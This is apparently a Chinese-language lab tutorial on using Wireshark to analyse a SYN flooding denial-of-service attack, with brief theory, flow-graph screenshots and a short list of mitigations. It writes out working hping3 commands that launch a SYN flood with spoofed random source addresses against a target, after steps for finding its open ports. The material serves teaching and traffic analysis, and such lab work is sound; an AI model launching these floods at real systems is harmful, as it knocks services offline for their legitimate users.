**WireShark学习——使用WirkShark分析SYN-Flooding攻击**

1.  拒绝服务攻击的的相关理论

服务器所面临的最大威胁当数拒绝服务攻击,拒绝服务攻击其实是一类攻击的合称。所有这种类型的攻击的目的都是相同的,那就是要是使受攻击的服务器系统瘫痪或服务失效,从而使合法用户无法得到相应的资源。虽然服务器的功能多种多样,但是这些差异都是表现在应用层,无论它们使用的是什么应用程序,但是最终都会使用到传输层的协议。而传输层常用的协议只有TCP和UDP两种。因此攻击者只需要研究这两个协议的缺陷,就几乎可以实现对所有类型服务器的攻击。

目前已经出现了很多种类型的拒绝服务攻击方式,我们只挑选其中最为典型的两种SYN
flooding攻击和UDP flooding攻击进行讲解。其中SYN
flooding攻击是针对TCP协议的,它的主要目的是占用目标上所有可用的连接请求。而UDP
flooding攻击则是针对UDP协议的,主要目的是耗尽目标所在网络的带宽。

1.  使用Hping发起SYN Flooding攻击

我们先来一次简单的SYN FLOOD攻击：

(1)查看被攻击主机的IP和端口信息:ifconfig/all 获取IP

(2)netstat -ano 获取开放端口,最好找那些处于listenning的端口

(3)然后kali上输入:hping3 -S -p 135 --flood -V --rand-source 192.168.1.2

\-S表示采用SYN半连接方法

\--flood 尽可能快的发送数据包

\--rand-source 表示伪造IP地址

\-V 启用详细输出

(4)执行上述命令后在目标机上打开任务管理器

(5)查看CPU的利用率，你会发现明显提高了

1.我们采用Kali Linux
2中自带的hping3来进行一次拒绝服务攻击。这是一款用于生成和解析TCP/IP协议数据包的开源工具,之前推出过hping和hping2两个版本,目前最新的版本是hping3,利用这款工具我们可以快速定制数据包的各个部分,
hping3也是一个命令式的工具,其中的各种功能要依靠设置参数来实现。启动hping3的方式就是在Kali
Linux2中启动一个终端,然后输入"hping3 "即可.

root@kali:-\# hping3

hping3\>

2.现在我们就利用刚刚介绍过的hping3参数来构造一次基于TCP协议的拒绝服务攻击。在Kali
Linux 2中打开一个终端,然后在终端中输入:

hping3 -q -n --rand-source -S -p 80 --flood 目标IP

3\. 这时攻击就开始了,在这个过程中可以随时使用Ctrl+C组合键来结束这次攻击

1.  WireShark的流量图功能

2.  查看流量图

![](media/86648fac2c26fd1c7689a834d9eb880a.png)

1.  左下角，的限制显示过滤器，勾上后会显示使用显示过滤器过滤后的包

![](media/624642b556892732c3e72afdf65c5b56.png)

1.  以下为正常的tcp流

![](media/54b7aea6453236a8f58c345c6767bd6d.png)

1.  syn泛洪攻击的流，可以看到没有应答的包

![](media/21652f75ab38f5b476d002c5a7b0d073.png)

1.  SYN Flooding攻击解决方案

(1)丢弃第一个SYN数据包

(2)反向探测

(3)代理模式
